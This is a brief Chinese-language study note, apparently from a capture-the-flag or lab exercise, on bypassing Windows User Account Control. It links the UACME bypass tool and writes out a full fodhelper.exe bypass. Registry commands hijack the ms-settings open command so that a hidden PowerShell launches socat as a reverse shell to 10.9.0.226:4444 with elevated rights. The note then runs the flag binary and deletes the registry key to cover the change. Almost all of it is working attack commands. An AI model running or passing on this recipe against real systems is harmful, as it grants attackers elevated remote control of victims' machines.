![[绕过UAC image 155051d580f7d5c8.png|Exported image]]   
需要花费时间进行学习的 绕过的工具
 
[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)
 
绕过uac  
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command  
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.9.0.226:4444 EXEC:cmd.exe,pipes"
 
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
 
reg add %REG_KEY% /d %CMD% /f
   

fodhelper.exe  
C:\flags\GetFlag-fodhelper.exe
   

reg delete HKCU\Software\Classes\ms-settings\ /f